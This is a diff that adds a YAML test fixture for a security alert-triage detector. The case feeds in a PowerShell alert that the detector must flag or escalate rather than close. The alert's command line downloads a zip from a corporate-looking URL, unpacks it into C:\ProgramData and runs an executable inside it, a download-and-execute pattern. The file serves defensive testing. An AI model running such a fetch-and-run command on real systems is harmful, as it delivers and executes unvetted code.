@@ -1,0 +1,22 @@
+# Aimed case for PR-0022: the cheapest attacker position that satisfies the path group's yes answers. It must flag or escalate in every mode, never close.
+detection: D-0018
+name: d-0018-step1-q0
+reason: PowerShell download precedent reused with appended code and only approved URLs
+proof: PR-0022
+closures:
+- kind: manual_shadow_close
+  analyst: a1
+- kind: manual_shadow_close
+  analyst: a2
+overrides:
+  Q-0017: true
+  Q-0014: 0
+alert:
+  host.name: ws-19
+  user.name: jdoe
+  process.name: powershell.exe
+  process.parent_name: cmd.exe
+  process.sha256: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+  process.command_line: powershell.exe -c "iwr https://pkg.corp.example/tools.zip -OutFile C:\ProgramData\t.zip; Expand-Archive C:\ProgramData\t.zip C:\ProgramData\t; & C:\ProgramData\t\run.exe"
+  event.time: '2026-10-17T08:00:00Z'
+  severity: medium
